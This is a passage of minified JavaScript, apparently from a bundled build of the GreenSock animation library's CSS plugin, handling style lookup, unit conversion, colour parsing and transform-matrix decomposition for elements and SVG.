([0-9]{1,}[\.0-9]{0,})/.exec(V)||/Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/.exec(V))&&(m=parseFloat(RegExp.$1)),!!e&&(e.style.cssText="top:1px;opacity:.55;",/^0.55/.test(e.style.opacity))}(),X=function(t){return T.test("string"==typeof t?t:(t.currentStyle?t.currentStyle.filter:t.style.filter)||"")?parseFloat(RegExp.$1)/100:1},$=function(t){r._gsScope.console},q="",Z="",K=function(t,e){var i,n,r=(e=e||j).style;if(void 0!==r[t])return t;for(t=t.charAt(0).toUpperCase()+t.substr(1),i=["O","Moz","ms","Ms","Webkit"],n=5;--n>-1&&void 0===r[i[n]+t];);return n>=0?(q="-"+(Z=3===n?"ms":i[n]).toLowerCase()+"-",Z+t):null},J="undefined"!=typeof window?window:U.defaultView||{getComputedStyle:function(){}},Q=function(t){return J.getComputedStyle(t)},tt=o.getStyle=function(t,e,i,n,r){var a;return Y||"opacity"!==e?(!n&&t.style[e]?a=t.style[e]:(i=i||Q(t))?a=i[e]||i.getPropertyValue(e)||i.getPropertyValue(e.replace(L,"-$1").toLowerCase()):t.currentStyle&&(a=t.currentStyle[e]),null==r||a&&"none"!==a&&"auto"!==a&&"auto auto"!==a?a:r):X(t)},et=H.convertToPixels=function(t,e,i,n,a){if("px"===n||!n&&"lineHeight"!==e)return i;if("auto"===n||!i)return 0;var s,l,c,h=O.test(e),u=t,d=j.style,p=i<0,f=1===i;if(p&&(i=-i),f&&(i*=100),"lineHeight"!==e||n)if("%"===n&&-1!==e.indexOf("border"))s=i/100*(h?t.clientWidth:t.clientHeight);else{if(d.cssText="border:0 solid red;position:"+tt(t,"position")+";line-height:0;","%"!==n&&u.appendChild&&"v"!==n.charAt(0)&&"rem"!==n)d[h?"borderLeftWidth":"borderTopWidth"]=i+n;else{if(u=t.parentNode||U.body,-1!==tt(u,"display").indexOf("flex")&&(d.position="absolute"),l=u._gsCache,c=r.default.ticker.frame,l&&h&&l.time===c)return l.width*i/100;d[h?"width":"height"]=i+n}u.appendChild(j),s=parseFloat(j[h?"offsetWidth":"offsetHeight"]),u.removeChild(j),h&&"%"===n&&!1!==o.cacheWidths&&((l=u._gsCache=u._gsCache||{}).time=c,l.width=s/i*100),0!==s||a||(s=et(t,e,i,n,!0))}else l=Q(t).lineHeight,t.style.lineHeight=i,s=parseFloat(Q(t).lineHeight),t.style.lineHeight=l;return f&&(s/=100),p?-s:s},it=H.calculateOffset=function(t,e,i){if("absolute"!==tt(t,"position",i))return 0;var n="left"===e?"Left":"Top",r=tt(t,"margin"+n,i);return t["offset"+n]-(et(t,e,parseFloat(r),r.replace(w,""))||0)},nt=function(t,e){var i,n,r,a={};if(e=e||Q(t))if(i=e.length)for(;--i>-1;)-1!==(r=e[i]).indexOf("-transform")&&It!==r||(a[r.replace(k,P)]=e.getPropertyValue(r));else for(i in e)-1!==i.indexOf("Transform")&&Rt!==i||(a[i]=e[i]);else if(e=t.currentStyle||t.style)for(i in e)"string"==typeof i&&void 0===a[i]&&(a[i.replace(k,P)]=e[i]);return Y||(a.opacity=X(t)),n=$t(t,e,!1),a.rotation=n.rotation,a.skewX=n.skewX,a.scaleX=n.scaleX,a.scaleY=n.scaleY,a.x=n.x,a.y=n.y,Nt&&(a.z=n.z,a.rotationX=n.rotationX,a.rotationY=n.rotationY,a.scaleZ=n.scaleZ),a.filters&&delete a.filters,a},rt=function(t,e,i,n,r){var a,o,s,l={},c=t.style;for(o in i)"cssText"!==o&&"length"!==o&&isNaN(o)&&(e[o]!==(a=i[o])||r&&r[o])&&-1===o.indexOf("Origin")&&("number"!=typeof a&&"string"!=typeof a||(l[o]="auto"!==a||"left"!==o&&"top"!==o?""!==a&&"auto"!==a&&"none"!==a||"string"!=typeof e[o]||""===e[o].replace(b,"")?a:0:it(t,o),void 0!==c[o]&&(s=new yt(c,o,c[o],s))));if(n)for(o in n)"className"!==o&&(l[o]=n[o]);return{difs:l,firstMPT:s}},at={width:["Left","Right"],height:["Top","Bottom"]},ot=["marginLeft","marginRight","marginTop","marginBottom"],st=function(t,e,i){if("svg"===(t.nodeName+"").toLowerCase())return(i||Q(t))[e]||0;if(t.getCTM&&Vt(t))return t.getBBox()[e]||0;var n=parseFloat("width"===e?t.offsetWidth:t.offsetHeight),r=at[e],a=r.length;for(i=i||Q(t);--a>-1;)n-=parseFloat(tt(t,"padding"+r[a],i,!0))||0,n-=parseFloat(tt(t,"border"+r[a]+"Width",i,!0))||0;return n},lt=function t(e,i){if("contain"===e||"auto"===e||"auto auto"===e)return e+" ";null!=e&&""!==e||(e="0 0");var n,r=e.split(" "),a=-1!==e.indexOf("left")?"0%":-1!==e.indexOf("right")?"100%":r[0],o=-1!==e.indexOf("top")?"0%":-1!==e.indexOf("bottom")?"100%":r[1];if(r.length>3&&!i){for(r=e.split(", ").join(",").split(","),e=[],n=0;n<r.length;n++)e.push(t(r[n]));return e.join(",")}return null==o?o="center"===a?"50%":"0":"center"===o&&(o="50%"),("center"===a||isNaN(parseFloat(a))&&-1===(a+"").indexOf("="))&&(a="50%"),e=a+" "+o+(r.length>2?" "+r[2]:""),i&&(i.oxp=-1!==a.indexOf("%"),i.oyp=-1!==o.indexOf("%"),i.oxr="="===a.charAt(1),i.oyr="="===o.charAt(1),i.ox=parseFloat(a.replace(b,"")),i.oy=parseFloat(o.replace(b,"")),i.v=e),i||e},ct=function(t,e){return"function"==typeof t&&(t=t(g,_)),"string"==typeof t&&"="===t.charAt(1)?parseInt(t.charAt(0)+"1",10)*parseFloat(t.substr(2)):parseFloat(t)-parseFloat(e)||0},ht=function(t,e){"function"==typeof t&&(t=t(g,_));var i="string"==typeof t&&"="===t.charAt(1);return"string"==typeof t&&"v"===t.charAt(t.length-2)&&(t=(i?t.substr(0,2):0)+window["inner"+("vh"===t.substr(-2)?"Height":"Width")]*(parseFloat(i?t.substr(2):t)/100)),null==t?e:i?parseInt(t.charAt(0)+"1",10)*parseFloat(t.substr(2))+e:parseFloat(t)||0},ut=function(t,e,i,n){var r,a,o,s;return"function"==typeof t&&(t=t(g,_)),null==t?o=e:"number"==typeof t?o=t:(r=t.split("_"),a=((s="="===t.charAt(1))?parseInt(t.charAt(0)+"1",10)*parseFloat(r[0].substr(2)):parseFloat(r[0]))*(-1===t.indexOf("rad")?1:z)-(s?0:e),r.length&&(n&&(n[i]=e+a),-1!==t.indexOf("short")&&(a%=360)!=a%180&&(a=a<0?a+360:a-360),-1!==t.indexOf("_cw")&&a<0?a=(a+3599999999640)%360-360*(a/360|0):-1!==t.indexOf("ccw")&&a>0&&(a=(a-3599999999640)%360-360*(a/360|0))),o=e+a),o<1e-6&&o>-1e-6&&(o=0),o},dt={aqua:[0,255,255],lime:[0,255,0],silver:[192,192,192],black:[0,0,0],maroon:[128,0,0],teal:[0,128,128],blue:[0,0,255],navy:[0,0,128],white:[255,255,255],fuchsia:[255,0,255],olive:[128,128,0],yellow:[255,255,0],orange:[255,165,0],gray:[128,128,128],purple:[128,0,128],green:[0,128,0],red:[255,0,0],pink:[255,192,203],cyan:[0,255,255],transparent:[255,255,255,0]},pt=function(t,e,i){return 255*(6*(t=t<0?t+1:t>1?t-1:t)<1?e+(i-e)*t*6:t<.5?i:3*t<2?e+(i-e)*(2/3-t)*6:e)+.5|0},ft=o.parseColor=function(t,e){var i,n,r,a,o,s,l,c,h,u,d;if(t)if("number"==typeof t)i=[t>>16,t>>8&255,255&t];else{if(","===t.charAt(t.length-1)&&(t=t.substr(0,t.length-1)),dt[t])i=dt[t];else if("#"===t.charAt(0))4===t.length&&(n=t.charAt(1),r=t.charAt(2),a=t.charAt(3),t="#"+n+n+r+r+a+a),i=[(t=parseInt(t.substr(1),16))>>16,t>>8&255,255&t];else if("hsl"===t.substr(0,3))if(i=d=t.match(v),e){if(-1!==t.indexOf("="))return t.match(y)}else o=Number(i[0])%360/360,s=Number(i[1])/100,n=2*(l=Number(i[2])/100)-(r=l<=.5?l*(s+1):l+s-l*s),i.length>3&&(i[3]=Number(i[3])),i[0]=pt(o+1/3,n,r),i[1]=pt(o,n,r),i[2]=pt(o-1/3,n,r);else i=t.match(v)||dt.transparent;i[0]=Number(i[0]),i[1]=Number(i[1]),i[2]=Number(i[2]),i.length>3&&(i[3]=Number(i[3]))}else i=dt.black;return e&&!d&&(n=i[0]/255,r=i[1]/255,a=i[2]/255,l=((c=Math.max(n,r,a))+(h=Math.min(n,r,a)))/2,c===h?o=s=0:(u=c-h,s=l>.5?u/(2-c-h):u/(c+h),o=c===n?(r-a)/u+(r<a?6:0):c===r?(a-n)/u+2:(n-r)/u+4,o*=60),i[0]=o+.5|0,i[1]=100*s+.5|0,i[2]=100*l+.5|0),i},mt=function(t,e){var i,n,r,a=t.match(_t)||[],o=0,s="";if(!a.length)return t;for(i=0;i<a.length;i++)n=a[i],o+=(r=t.substr(o,t.indexOf(n,o)-o)).length+n.length,3===(n=ft(n,e)).length&&n.push(1),s+=r+(e?"hsla("+n[0]+","+n[1]+"%,"+n[2]+"%,"+n[3]:"rgba("+n.join(","))+")";return s+t.substr(o)},_t="(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3}){1,2}\\b";for(c in dt)_t+="|"+c+"\\b";_t=new RegExp(_t+")","gi"),o.colorStringFilter=function(t){var e,i=t[0]+" "+t[1];_t.test(i)&&(e=-1!==i.indexOf("hsl(")||-1!==i.indexOf("hsla("),t[0]=mt(t[0],e),t[1]=mt(t[1],e)),_t.lastIndex=0},r.default.defaultStringFilter||(r.default.defaultStringFilter=o.colorStringFilter);var gt=function(t,e,i,n){if(null==t)return function(t){return t};var r,a=e?(t.match(_t)||[""])[0]:"",o=t.split(a).join("").match(x)||[],s=t.substr(0,t.indexOf(o[0])),l=")"===t.charAt(t.length-1)?")":"",c=-1!==t.indexOf(" ")?" ":",",h=o.length,u=h>0?o[0].replace(v,""):"";return h?r=e?function(t){var e,d,p,f;if("number"==typeof t)t+=u;else if(n&&I.test(t)){for(f=t.replace(I,"|").split("|"),p=0;p<f.length;p++)f[p]=r(f[p]);return f.join(",")}if(e=(t.match(_t)||[a])[0],p=(d=t.split(e).join("").match(x)||[]).length,h>p--)for(;++p<h;)d[p]=i?d[(p-1)/2|0]:o[p];return s+d.join(c)+c+e+l+(-1!==t.indexOf("inset")?" inset":"")}:function(t){var e,a,d;if("number"==typeof t)t+=u;else if(n&&I.test(t)){for(a=t.replace(I,"|").split("|"),d=0;d<a.length;d++)a[d]=r(a[d]);return a.join(",")}if(d=(e=t.match(x)||[]).length,h>d--)for(;++d<h;)e[d]=i?e[(d-1)/2|0]:o[d];return s+e.join(c)+l}:function(t){return t}},vt=function(t){return t=t.split(","),function(e,i,n,r,a,o,s){var l,c=(i+"").split(" ");for(s={},l=0;l<4;l++)s[t[l]]=c[l]=c[l]||c[(l-1)/2>>0];return r.parse(e,s,a,o)}},yt=(H._setPluginRatio=function(t){this.plugin.setRatio(t);for(var e,i,n,r,a,o=this.data,s=o.proxy,l=o.firstMPT;l;)e=s[l.v],l.r?e=l.r(e):e<1e-6&&e>-1e-6&&(e=0),l.t[l.p]=e,l=l._next;if(o.autoRotate&&(o.autoRotate.rotation=o.mod?o.mod.call(this._tween,s.rotation,this.t,this._tween):s.rotation),1===t||0===t)for(l=o.firstMPT,a=1===t?"e":"b";l;){if((i=l.t).type){if(1===i.type){for(r=i.xs0+i.s+i.xs1,n=1;n<i.l;n++)r+=i["xn"+n]+i["xs"+(n+1)];i[a]=r}}else i[a]=i.s+i.xs0;l=l._next}},function(t,e,i,n,r){this.t=t,this.p=e,this.v=i,this.r=r,n&&(n._prev=this,this._next=n)}),xt=(H._parseToProxy=function(t,e,i,n,r,a){var o,s,l,c,h,u=n,d={},p={},f=i._transform,m=D;for(i._transform=null,D=e,n=h=i.parse(t,e,n,r),D=m,a&&(i._transform=f,u&&(u._prev=null,u._prev&&(u._prev._next=null)));n&&n!==u;){if(n.type<=1&&(p[s=n.p]=n.s+n.c,d[s]=n.s,a||(c=new yt(n,"s",s,c,n.r),n.c=0),1===n.type))for(o=n.l;--o>0;)l="xn"+o,p[s=n.p+"_"+l]=n.data[l],d[s]=n[l],a||(c=new yt(n,l,s,c,n.rxp[l]));n=n._next}return{proxy:d,end:p,firstMPT:c,pt:h}},H.CSSPropTween=function(e,i,n,r,o,s,l,c,h,u,d){this.t=e,this.p=i,this.s=n,this.c=r,this.n=l||i,e instanceof xt||a.push(this.n),this.r=c?"function"==typeof c?c:Math.round:c,this.type=s||0,h&&(this.pr=h,t=!0),this.b=void 0===u?n:u,this.e=void 0===d?n+r:d,o&&(this._next=o,o._prev=this)}),bt=function(t,e,i,n,r,a){var o=new xt(t,e,i,n-i,r,-1,a);return o.b=i,o.e=o.xs0=n,o},wt=o.parseComplex=function(t,e,i,n,r,a,s,l,c,u){i=i||a||"","function"==typeof n&&(n=n(g,_)),s=new xt(t,e,0,0,s,u?2:1,null,!1,l,i,n),n+="",r&&_t.test(n+i)&&(o.colorStringFilter(n=[i,n]),i=n[0],n=n[1]);var d,p,f,m,x,b,w,T,S,M,E,L,k,A=i.split(", ").join(",").split(" "),P=n.split(", ").join(",").split(" "),O=A.length,C=!1!==h;for(-1===n.indexOf(",")&&-1===i.indexOf(",")||(-1!==(n+i).indexOf("rgb")||-1!==(n+i).indexOf("hsl")?(A=A.join(" ").replace(I,", ").split(" "),P=P.join(" ").replace(I,", ").split(" ")):(A=A.join(" ").split(",").join(", ").split(" "),P=P.join(" ").split(",").join(", ").split(" ")),O=A.length),O!==P.length&&(O=(A=(a||"").split(" ")).length),s.plugin=c,s.setRatio=u,_t.lastIndex=0,d=0;d<O;d++)if(m=A[d],x=P[d]+"",(T=parseFloat(m))||0===T)s.appendXtra("",T,ct(x,T),x.replace(y,""),!(!C||-1===x.indexOf("px"))&&Math.round,!0);else if(r&&_t.test(m))L=")"+((L=x.indexOf(")")+1)?x.substr(L):""),k=-1!==x.indexOf("hsl")&&Y,M=x,m=ft(m,k),x=ft(x,k),(S=m.length+x.length>6)&&!Y&&0===x[3]?(s["xs"+s.l]+=s.l?" transparent":"transparent",s.e=s.e.split(P[d]).join("transparent")):(Y||(S=!1),k?s.appendXtra(M.substr(0,M.indexOf("hsl"))+(S?"hsla(":"hsl("),m[0],ct(x[0],m[0]),",",!1,!0).appendXtra("",m[1],ct(x[1],m[1]),"%,",!1).appendXtra("",m[2],ct(x[2],m[2]),S?"%,":"%"+L,!1):s.appendXtra(M.substr(0,M.indexOf("rgb"))+(S?"rgba(":"rgb("),m[0],x[0]-m[0],",",Math.round,!0).appendXtra("",m[1],x[1]-m[1],",",Math.round).appendXtra("",m[2],x[2]-m[2],S?",":L,Math.round),S&&(m=m.length<4?1:m[3],s.appendXtra("",m,(x.length<4?1:x[3])-m,L,!1))),_t.lastIndex=0;else if(b=m.match(v)){if(!(w=x.match(y))||w.length!==b.length)return s;for(f=0,p=0;p<b.length;p++)E=b[p],M=m.indexOf(E,f),s.appendXtra(m.substr(f,M-f),Number(E),ct(w[p],E),"",!(!C||"px"!==m.substr(M+E.length,2))&&Math.round,0===p),f=M+E.length;s["xs"+s.l]+=m.substr(f)}else s["xs"+s.l]+=s.l||s["xs"+s.l]?" "+x:x;if(-1!==n.indexOf("=")&&s.data){for(L=s.xs0+s.data.s,d=1;d<s.l;d++)L+=s["xs"+d]+s.data["xn"+d];s.e=L+s["xs"+d]}return s.l||(s.type=-1,s.xs0=s.e),s.xfirst||s},Tt=9;for((c=xt.prototype).l=c.pr=0;--Tt>0;)c["xn"+Tt]=0,c["xs"+Tt]="";c.xs0="",c._next=c._prev=c.xfirst=c.data=c.plugin=c.setRatio=c.rxp=null,c.appendXtra=function(t,e,i,n,r,a){var o=this,s=o.l;return o["xs"+s]+=a&&(s||o["xs"+s])?" "+t:t||"",i||0===s||o.plugin?(o.l++,o.type=o.setRatio?2:1,o["xs"+o.l]=n||"",s>0?(o.data["xn"+s]=e+i,o.rxp["xn"+s]=r,o["xn"+s]=e,o.plugin||(o.xfirst=new xt(o,"xn"+s,e,i,o.xfirst||o,0,o.n,r,o.pr),o.xfirst.xs0=0),o):(o.data={s:e+i},o.rxp={},o.s=e,o.c=i,o.r=r,o)):(o["xs"+s]+=e+(n||""),o)};var St=function(t,e){e=e||{},this.p=e.prefix&&K(t)||t,l[t]=l[this.p]=this,this.format=e.formatter||gt(e.defaultValue,e.color,e.collapsible,e.multi),e.parser&&(this.parse=e.parser),this.clrs=e.color,this.multi=e.multi,this.keyword=e.keyword,this.dflt=e.defaultValue,this.allowFunc=e.allowFunc,this.pr=e.priority||0},Mt=H._registerComplexSpecialProp=function(t,e,i){"object"!==Object(n.a)(e)&&(e={parser:i});var r,a=t.split(","),o=e.defaultValue;for(i=i||[o],r=0;r<a.length;r++)e.prefix=0===r&&e.prefix,e.defaultValue=i[r]||o,new St(a[r],e)},Et=H._registerPluginProp=function(t){if(!l[t]){var e=t.charAt(0).toUpperCase()+t.substr(1)+"Plugin";Mt(t,{parser:function(t,i,n,r,a,o,c){var h=s.com.greensock.plugins[e];return h?(h._cssRegister(),l[n].parse(t,i,n,r,a,o,c)):($(),a)}})}};(c=St.prototype).parseComplex=function(t,e,i,n,r,a){var o,s,l,c,h,u,d=this.keyword;if(this.multi&&(I.test(i)||I.test(e)?(s=e.replace(I,"|").split("|"),l=i.replace(I,"|").split("|")):d&&(s=[e],l=[i])),l){for(c=l.length>s.length?l.length:s.length,o=0;o<c;o++)e=s[o]=s[o]||this.dflt,i=l[o]=l[o]||this.dflt,d&&(h=e.indexOf(d))!==(u=i.indexOf(d))&&(-1===u?s[o]=s[o].split(d).join(""):-1===h&&(s[o]+=" "+d));e=s.join(", "),i=l.join(", ")}return wt(t,this.p,e,i,this.clrs,this.dflt,n,this.pr,r,a)},c.parse=function(t,e,n,r,a,o,s){return this.parseComplex(t.style,this.format(tt(t,this.p,i,!1,this.dflt)),this.format(e),a,o)},o.registerSpecialProp=function(t,e,i){Mt(t,{parser:function(t,n,r,a,o,s,l){var c=new xt(t,r,0,0,o,2,r,!1,i);return c.plugin=s,c.setRatio=e(t,n,a._tween,r),c},priority:i})},o.useSVGTransformAttr=!0;var Lt,kt,At,Pt,Ot,Ct="scaleX,scaleY,scaleZ,x,y,z,skewX,skewY,rotation,rotationX,rotationY,perspective,xPercent,yPercent".split(","),Rt=K("transform"),It=q+"transform",Ft=K("transformOrigin"),Nt=null!==K("perspective"),zt=H.Transform=function(){this.perspective=parseFloat(o.defaultTransformPerspective)||0,this.force3D=!(!1===o.defaultForce3D||!Nt)&&(o.defaultForce3D||"auto")},Dt=r._gsScope.SVGElement,Gt=function(t,e,i){var n,r=U.createElementNS("http://www.w3.org/2000/svg",t),a=/([a-z])([A-Z])/g;for(n in i)r.setAttributeNS(null,n.replace(a,"$1-$2").toLowerCase(),i[n]);return e.appendChild(r),r},Ut=U.documentElement||{},Bt=(Ot=m||/Android/i.test(V)&&!r._gsScope.chrome,U.createElementNS&&!Ot&&(kt=Gt("svg",Ut),Pt=(At=Gt("rect",kt,{width:100,height:50,x:100})).getBoundingClientRect().width,At.style[Ft]="50% 50%",At.style[Rt]="scaleX(0.5)",Ot=Pt===At.getBoundingClientRect().width&&!(p&&Nt),Ut.removeChild(kt)),Ot),jt=function(t,e,i,n,r,a){var s,l,c,h,u,d,p,f,m,_,g,v,y,x,b=t._gsTransform,w=Xt(t,!0);b&&(y=b.xOrigin,x=b.yOrigin),(!n||(s=n.split(" ")).length<2)&&(0===(p=t.getBBox()).x&&0===p.y&&p.width+p.height===0&&(p={x:parseFloat(t.hasAttribute("x")?t.getAttribute("x"):t.hasAttribute("cx")?t.getAttribute("cx"):0)||0,y:parseFloat(t.hasAttribute("y")?t.getAttribute("y"):t.hasAttribute("cy")?t.getAttribute("cy"):0)||0,width:0,height:0}),s=[(-1!==(e=lt(e).split(" "))[0].indexOf("%")?parseFloat(e[0])/100*p.width:parseFloat(e[0]))+p.x,(-1!==e[1].indexOf("%")?parseFloat(e[1])/100*p.height:parseFloat(e[1]))+p.y]),i.xOrigin=h=parseFloat(s[0]),i.yOrigin=u=parseFloat(s[1]),n&&w!==Yt&&(d=w[0],p=w[1],f=w[2],m=w[3],_=w[4],g=w[5],(v=d*m-p*f)&&(l=h*(m/v)+u*(-f/v)+(f*g-m*_)/v,c=h*(-p/v)+u*(d/v)-(d*g-p*_)/v,h=i.xOrigin=s[0]=l,u=i.yOrigin=s[1]=c)),b&&(a&&(i.xOffset=b.xOffset,i.yOffset=b.yOffset,b=i),r||!1!==r&&!1!==o.defaultSmoothOrigin?(l=h-y,c=u-x,b.xOffset+=l*w[0]+c*w[2]-l,b.yOffset+=l*w[1]+c*w[3]-c):b.xOffset=b.yOffset=0),a||t.setAttribute("data-svg-origin",s.join(" "))},Wt=function t(e){var i,n=B("svg",this.ownerSVGElement&&this.ownerSVGElement.getAttribute("xmlns")||"http://www.w3.org/2000/svg"),r=this.parentNode,a=this.nextSibling,o=this.style.cssText;if(Ut.appendChild(n),n.appendChild(this),this.style.display="block",e)try{i=this.getBBox(),this._originalGetBBox=this.getBBox,this.getBBox=t}catch(t){}else this._originalGetBBox&&(i=this._originalGetBBox());return a?r.insertBefore(this,a):r.appendChild(this),Ut.removeChild(n),this.style.cssText=o,i},Ht=function(t){try{return t.getBBox()}catch(e){return Wt.call(t,!0)}},Vt=function(t){return!(!Dt||!t.getCTM||t.parentNode&&!t.ownerSVGElement||!Ht(t))},Yt=[1,0,0,1,0,0],Xt=function(t,e){var i,n,r,a,o,s,l,c=t._gsTransform||new zt,h=t.style;if(Rt?n=tt(t,It,null,!0):t.currentStyle&&(n=(n=t.currentStyle.filter.match(C))&&4===n.length?[n[0].substr(4),Number(n[2].substr(4)),Number(n[1].substr(4)),n[3].substr(4),c.x||0,c.y||0].join(","):""),i=!n||"none"===n||"matrix(1, 0, 0, 1, 0, 0)"===n,Rt&&i&&!t.offsetParent&&(a=h.display,h.display="block",(l=t.parentNode)&&t.offsetParent||(o=1,s=t.nextSibling,Ut.appendChild(t)),i=!(n=tt(t,It,null,!0))||"none"===n||"matrix(1, 0, 0, 1, 0, 0)"===n,a?h.display=a:Jt(h,"display"),o&&(s?l.insertBefore(t,s):l?l.appendChild(t):Ut.removeChild(t))),(c.svg||t.getCTM&&Vt(t))&&(i&&-1!==(h[Rt]+"").indexOf("matrix")&&(n=h[Rt],i=0),r=t.getAttribute("transform"),i&&r&&(n="matrix("+(r=t.transform.baseVal.consolidate().matrix).a+","+r.b+","+r.c+","+r.d+","+r.e+","+r.f+")",i=0)),i)return Yt;for(r=(n||"").match(v)||[],Tt=r.length;--Tt>-1;)a=Number(r[Tt]),r[Tt]=(o=a-(a|=0))?(1e5*o+(o<0?-.5:.5)|0)/1e5+a:a;return e&&r.length>6?[r[0],r[1],r[4],r[5],r[12],r[13]]:r},$t=H.getTransform=function(t,e,i,n){if(t._gsTransform&&i&&!n)return t._gsTransform;var a,s,l,c,h,u,d=i&&t._gsTransform||new zt,p=d.scaleX<0,f=Nt&&(parseFloat(tt(t,Ft,e,!1,"0 0 0").split(" ")[2])||d.zOrigin)||0,m=parseFloat(o.defaultTransformPerspective)||0;if(d.svg=!(!t.getCTM||!Vt(t)),d.svg&&(jt(t,tt(t,Ft,e,!1,"50% 50%")+"",d,t.getAttribute("data-svg-origin")),Lt=o.useSVGTransformAttr||Bt),(a=Xt(t))!==Yt){if(16===a.length){var _,g,v,y,x,b=a[0],w=a[1],T=a[2],S=a[3],M=a[4],E=a[5],L=a[6],k=a[7],A=a[8],P=a[9],O=a[10],C=a[12],R=a[13],I=a[14],F=a[11],N=Math.atan2(L,O);d.zOrigin&&(C=A*(I=-d.zOrigin)-a[12],R=P*I-a[13],I=O*I+d.zOrigin-a[14]),d.rotationX=N*z,N&&(_=M*(y=Math.cos(-N))+A*(x=Math.sin(-N)),g=E*y+P*x,v=L*y+O*x,A=M*-x+A*y,P=E*-x+P*y,O=L*-x+O*y,F=k*-x+F*y,M=_,E=g,L=v),N=Math.atan2(-T,O),d.rotationY=N*z,N&&(g=w*(y=Math.cos(-N))-P*(x=Math.sin(-N)),v=T*y-O*x,P=w*x+P*y,O=T*x+O*y,F=S*x+F*y,b=_=b*y-A*x,w=g,T=v),N=Math.atan2(w,b),d.rotation=N*z,N&&(_=b*(y=Math.cos(N))+w*(x=Math.sin(N)),g=M*y+E*x,v=A*y+P*x,w=w*y-b*x,E=E*y-M*x,P=P*y-A*x,b=_,M=g,A=v),d.rotationX&&Math.abs(d.rotationX)+Math.abs(d.rotation)>359.9&&(d.rotationX=d.rotation=0,d.rotationY=180-d.rotationY),N=Math.atan2(M,E),d.scaleX=(1e5*Math.sqrt(b*b+w*w+T*T)+.5|0)/1e5,d.scaleY=(1e5*Math.sqrt(E*E+L*L)+.5|0)/1e5,d.scaleZ=(1e5*Math.sqrt(A*A+P*P+O*O)+.5|0)/1e5,b/=d.scaleX,M/=d.scaleY,w/=d.scaleX,E/=d.scaleY,Math.abs(N)>2e-5?(d.skewX=N*z,M=0,"simple"!==d.skewType&&(d.scaleY*=1/Math.cos(N))):d.skewX=0,d.perspective=F?1/(F<0?-F:F):0,d.x=C,d.y=R,d.z=I,d.svg&&(d.x-=d.xOrigin-(d.xOrigin*b-d.yOrigin*M),d.y-=d.yOrigin-(d.yOrigin*w-d.xOrigin*E))}else if(!Nt||n||!a.length||d.x!==a[4]||d.y!==a[5]||!d.rotationX&&!d.rotationY){var D=a.length>=6,G=D?a[0]:1,U=a[1]||0,B=a[2]||0,j=D?a[3]:1;d.x=a[4]||0,d.y=a[5]||0,l=Math.sqrt(G*G+U*U),c=Math.sqrt(j*j+B*B),h=G||U?Math.atan2(U,G)*z:d.rotation||0,u=B||j?Math.atan2(B,j)*z+h:d.skewX||0,d.scaleX=l,d.scaleY=c,d.rotation=h,d.skewX=u,Nt&&(d.rotationX=d.rotationY=d.z=0,d.perspective=m,d.scaleZ=1),d.svg&&(d.x-=d.xOrigin-(d.xOrigin*G+d.yOrigin*B),d.y-=d.yOrigin-(d.xOrigin*U+d.yOrigin*j))}for(s in Math.abs(d.skewX)>90&&Math.abs(d.skewX)<270&&(p?(d.scaleX*=-1,d.skewX+=d.rotation<=0?180:-180,d.rotation+=d.rotation<=0?180:-180):(d.scaleY*=-1,d.skewX+=d.skewX<=0?180:-180)),d.zOrigin=f,d)d[s]<2e-5&&d[s]>-2e-5&&(d[s]=0)}return i&&(t._gsTransform=d,d.svg&&(Lt&&t.style[Rt]?r.default.delayedCall(.001,(function(){Jt(t.style,Rt)})):!Lt&&t.getAttribute("transform")&&r.default.delayedCall(.001,(function(){t.removeAttribute("transform")})))),d},qt=function(t){var e,i,n=this.data,r=-n.rotation*N,a=r+n.skewX*N,o=(Math.cos(r)*n.scaleX*1e5|0)/1e5,s=(Math.sin(r)*n.scaleX*1e5|0)/1e5,l=(Math.sin(a)*-n.scaleY*1e5|0)/1e5,c=(Math.cos(a)*n.scaleY*1e5|0)/1e5,h=this.t.style,u=this.t.currentStyle;if(u){i=s,s=-l,l=-i,e=u.filter,h.filter="";var d,p,f=this.t.offsetWidth,_=this.t.offsetHeight,g="absolute"!==u.position,v="progid:DXImageTransform.Microsoft.Matrix(M11="+o+", M12="+s+", M21="+l+", M22="+c,y=n.x+f*n.xPercent/100,x=n.y+_*n.yPercent/100;if(null!=n.ox&&(y+=(d=(n.oxp?f*n.ox*.01:n.ox)-f/2)-(d*o+(p=(n.oyp?_*n.oy*.01:n.oy)-_/2)*s),x+=p-(d*l+p*c)),v+=g?", Dx="+((d=f/2)-(d*o+(p=_/2)*s)+y)+", Dy="+(p-(d*l+p*c)+x)+")":", sizingMethod='auto expand')",-1!==e.indexOf("DXImageTransform.Microsoft.Matrix(")?h.filter=e.replace(R,v):h.filter=v+" "+e,0!==t&&1!==t||1===o&&0===s&&0===l&&1===c&&(g&&-1===v.indexOf("Dx=0, Dy=0")||T.test(e)&&100!==parseFloat(RegExp.$1)||-1===e.indexOf(e.indexOf("Alpha"))&&h.removeAttribute("filter")),!g){var b,S,M,E=m<8?1:-1;for(d=n.ieOffsetX||0,p=n.ieOffsetY||0,n.ieOffsetX=Math.round((f-((o<0?-o:o)*f+(s<0?-s:s)*_))/2+y),n.ieOffsetY=Math.round((_-((c<0?-c:c)*_+(l<0?-l:l)*f))/2+x),Tt=0;Tt<4;Tt++)M=(i=-1!==(b=u[S=ot[Tt]]).indexOf("px")?parseFloat(b):et(this.t,S,parseFloat(b),b.replace(w,""))||0)!==n[S]?Tt<2?-n.ieOffsetX:-n.ieOffsetY:Tt<2?d-n.ieOffsetX:p-n.ieOffsetY,h[S]=(n[S]=Math.round(i-M*(0===Tt||2===Tt?1:E)))+"px"}}},Zt=H.set3DTransformRatio=H.setTransformRatio=function(t){var 